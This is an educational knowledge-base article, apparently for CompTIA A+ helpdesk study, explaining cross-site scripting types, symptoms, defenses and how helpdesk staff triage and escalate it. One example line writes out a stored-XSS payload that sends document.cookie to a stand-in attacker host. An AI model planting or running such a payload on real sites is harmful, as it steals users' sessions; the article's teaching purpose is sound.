# Cross-site Scripting

## What it is

A user opens a ticket: "The company portal is showing a weird popup that says 'your session expired, log in again' but I just logged in." You check the URL. It's the real portal. You check the page source. There's a `<script>` block in the comments section that nobody on your team wrote. Somebody injected JavaScript into a field the portal didn't sanitize, and now every user who loads that page is running attacker code inside their authenticated session.

That's cross-site scripting. In plain English: a website lets a user type something in (comment, search box, profile bio, URL parameter), then displays that something back to other users *without checking if it's code*. The browser, trusting the site, runs the injected script. The attacker borrows the site's reputation and the victim's session to do things the victim never asked for — steal cookies, redirect to phishing, log keystrokes, post on their behalf.

Technical definition: **XSS is a client-side code injection attack where malicious scripts execute in a victim's browser because a trusted web application failed to sanitize user-supplied input before rendering it.** Three flavors: **stored** (script saved in the database, served to every visitor), **reflected** (script in a crafted URL, runs when the victim clicks the link), and **DOM-based** (script never touches the server — manipulated client-side via JavaScript).

The web app is the immune system. XSS is the immune system letting a foreign script walk in wearing the site's own badge.

## Why it matters

XSS has been in the OWASP Top 10 for two decades and it's not leaving. It's how attackers hijack admin sessions, deface internal dashboards, and stage credential harvesting that looks 100% legitimate because it *is* on the legitimate domain. You won't be patching XSS as a helpdesk tech — that's the dev team's job — but you'll be the first person a user calls when something on a company web app looks wrong, and you need to recognize the symptoms fast enough to escalate before the attacker pivots.

Tested on **220-1202 Objective 2.5** as a threat under social engineering, threats, and vulnerabilities.

## At home, at work

**Beat 1 — Technical depth.** **Stored XSS** lives in the database — a malicious comment or poisoned profile field containing `<script>fetch('attacker.com/steal?c='+document.cookie)</script>`. Every visitor runs the script. Highest impact. **Reflected XSS** lives in the URL — `portal.company.com/search?q=<script>...</script>`. The attacker phishes the link; the victim clicks; the search page reflects the script back. Pairs perfectly with phishing. **DOM-based XSS** never touches the server — the page's own JavaScript reads from `window.location` and writes it into the DOM without sanitizing. Server logs show nothing. Hardest to catch.

**Beat 2 — The Discord server you used to mod.** Somebody posted a "cool emoji" in general chat that was actually an embedded link with an `onerror` payload. Anyone whose client auto-rendered it leaked their token. The server got nuked from inside in twenty minutes — bans, role changes, channel deletions, all from accounts whose owners did nothing wrong. *The attacker didn't need passwords. They had active sessions.*

You patched it the only way a mod can: locked posting, banned the original poster, told everyone to log out everywhere and regenerate tokens. *The damage was done before moderation caught up.*

The lesson that stuck: the site you trust is only as safe as the inputs it sanitizes. *Trust is transitive, and XSS exploits that.*

**Beat 3 — Bridge to the enterprise.** Same attack, bigger stakes. Internal SharePoint customization, a homegrown ticketing system, a vendor web app nobody's audited in three years. User reports "the page looks weird" or "I keep getting logged out." You check: there's a script in a comment field, or a URL parameter is rendering as HTML. You document, screenshot, *do not click the suspicious link on a privileged account*, and escalate immediately. An XSS on an internal admin panel can hand an attacker domain admin sessions. Same mechanic. Different blast radius.

**Beat 4 — The point.** Helpdesk doesn't fix XSS. Helpdesk *recognizes* XSS, isolates the user, and escalates before it spreads. Get the recognition pattern into your bones: "user sees unexpected popup / redirect / login prompt on a site they're already logged into" → think injection, not user error.

## Key facts

### The three types

| Type | Where the payload lives | Detection | Example |
|---|---|---|---|
| **Stored (Persistent)** | In the app's database | Page source shows unexpected scripts | Malicious forum post, poisoned profile |
| **Reflected** | In a crafted URL parameter | URL contains script tags or encoded JS | Phishing link to `site.com/?q=<script>` |
| **DOM-based** | Client-side JS only, never server | Server logs clean; browser dev tools show DOM mutation | SPA reading `location.hash` unsafely |

### What the attacker does with it

- **Session hijacking** — steal `document.cookie`, replay session as the victim
- **Credential harvesting** — overlay a fake login prompt on the real site (the URL bar is legit, so users trust it)
- **Keylogging** — attach event listeners to form fields
- **Pivot** — script makes authenticated requests to internal APIs the victim has access to

### Defenses (what dev/security will be doing)

- **Input sanitization and output encoding** — escape user input before rendering
- **Content Security Policy (CSP)** — HTTP header telling the browser what scripts are allowed to run
- **HttpOnly cookies** — `document.cookie` can't read them, blunting session theft
- **Web Application Firewall (WAF)** — pattern-matches and blocks common XSS payloads at the edge

### CompTIA exam traps

> **CompTIA exam trap:** XSS vs SQL injection — both are injection attacks, but XSS runs in the *victim's browser* (client-side); SQLi runs against the *database* (server-side). If the question mentions cookies, sessions, or popups, it's XSS. If it mentions database, query, or data exfiltration via crafted input, it's SQLi.

> **CompTIA exam trap:** XSS vs CSRF — XSS runs attacker code in the victim's browser. CSRF tricks the victim's browser into making a request the attacker wants (transfer money, change password) using the victim's existing session. Different mechanic, related family.

## Helpdesk reality

- **"There's a weird popup on the company site asking me to log in again."** → Don't dismiss it as a session timeout. Screenshot, ask what page they were on, escalate to security. Could be reflected XSS staging a credential grab.
- **"I clicked a link in an email and now the portal looks broken."** → Phishing-delivered reflected XSS. Isolate: close the browser, clear cookies for that domain, change password from a clean session. Preserve the email and URL for security.
- **Never click the suspicious URL from a privileged account to "see what happens."** Use an isolated VM or hand it to security. *Your admin session is exactly what the attacker is hoping you'll donate.*
- **Don't promise the user "the site is safe now."** You don't know that. Promise "I've escalated this and security is looking at it" — that's honest.
- **Document the URL, the exact page, the time, the user's browser and version, and screenshots.** Security needs all of it for forensics.

## AI tools as tickets and triage helpers

When a user sends a screenshot of a weird popup, drop it into your **company-approved AI assistant** (Microsoft Copilot, ServiceNow Now Assist) and ask "does this look like a phishing overlay or XSS payload?" The AI does the pattern recognition assist; you make the triage call.

For ticket writeups, paste your rough notes (URL, user, page, symptom, time) and ask the AI to format them into a structured security escalation.

**Hard rule:** never paste the victim's session cookie, credentials, or full URL with sensitive tokens into any AI tool. The whole point of XSS is session theft — don't be the helpdesk tech who finishes the attacker's job by pasting the stolen cookie into a chatbot.

## The honest part about your first IT job

You will not be hunting XSS bugs. You will be the person a confused user calls when "the website is acting weird," and your job is to ask the right questions, recognize the pattern, and get it to the right team without breaking the chain of evidence. *The tech who escalates fast and documents well is the tech who gets pulled onto the security team in two years.*

## Related concepts

[[SQL Injection]] · [[Phishing]] · [[On-path Attack]] · [[Zero-day Attack]] · [[Spoofing]] · [[Web Application Firewall]] · [[Browser Security]] · [[Incident Response]]

*Source: VIRGIL knowledge base — 2026-05-11*